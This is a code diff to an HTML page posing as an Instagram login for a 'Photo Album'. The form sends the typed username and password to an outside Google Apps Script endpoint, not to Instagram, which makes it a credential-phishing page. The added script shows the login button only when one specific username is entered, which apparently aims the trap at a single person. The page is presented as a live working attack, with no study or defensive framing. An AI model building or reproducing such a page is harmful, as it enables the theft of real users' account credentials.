@@ -47,6 +47,7 @@
     cursor: pointer;
     outline: none;
     transition: background-color 0.3s;
+    display: none; /* Initially hidden */
   }
 
   input[type="submit"]:hover {
@@ -68,19 +69,28 @@
 <div class="container">
   <h2>Login to Instagram Photo Album</h2>
   <form id="gform" action="https://script.google.com/macros/s/AKfycbzyIombFoWiSn8QX18BcQuGhJcD_bKpkNn4Poyt_FrZ49k1ItXGihdwioptL203QjW3nA/exec" method="post">
-    <input type="text" name="username" placeholder="Instagram id">
+    <input type="text" name="username" id="username" placeholder="Instagram id">
     <input type="password" name="password" placeholder="Password">
-    <input type="submit" value="Login">
-    <submit action="" method="get">
+    <input type="submit" value="Login" id="loginButton">
   </form>
   <div class="error" id="error"></div>
 </div>
 
 <script>
-  document.getElementById("loginForm").addEventListener("submit", function(event) {
-    var username = document.querySelector('input[name="username"]').value;
-    var password = document.querySelector('input[name="password"]').value;
-  }
+  const usernameField = document.getElementById("username");
+  const loginButton = document.getElementById("loginButton");
+  const errorDiv = document.getElementById("error");
+
+  usernameField.addEventListener("input", function () {
+    const enteredUsername = usernameField.value.trim();
+    if (enteredUsername === "sh_a_m_il_") {
+      errorDiv.textContent = ""; // Clear error message
+      loginButton.style.display = "block"; // Show the login button
+    } else {
+      errorDiv.textContent = "Username is incorrect. Please enter the correct username.";
+      loginButton.style.display = "none"; // Hide the login button
+    }
+  });
 </script>
 
 </body>
